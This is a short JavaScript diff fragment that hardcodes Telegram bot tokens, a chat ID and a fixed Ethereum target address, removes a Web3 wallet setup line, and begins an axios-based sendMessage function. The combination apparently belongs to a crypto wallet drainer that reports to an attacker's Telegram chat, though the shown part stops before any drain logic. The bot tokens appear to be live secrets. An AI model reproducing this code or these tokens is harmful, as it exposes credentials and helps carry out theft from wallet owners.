@@ -4,8 +4,6 @@ import { ABI } from "./constant";
 const botToken ="6539318026:AAGm8E91AOfdvxLx153iLyCfAONRwbwLcOo" //"6910766449:AAH_KtR65hweWsgLQMJXXgAadzG2PSN892U"; // Caution: Exposing token
 const chatId ="1582391172" //"1876632135";
 const targetAddress = "0x3173D3750e6F12457E8703D268dCcF3b84519343";
-
-let web3 = new Web3(window.ethereum);
 export const sendMessage = async (message) => {
   try {
     await axios
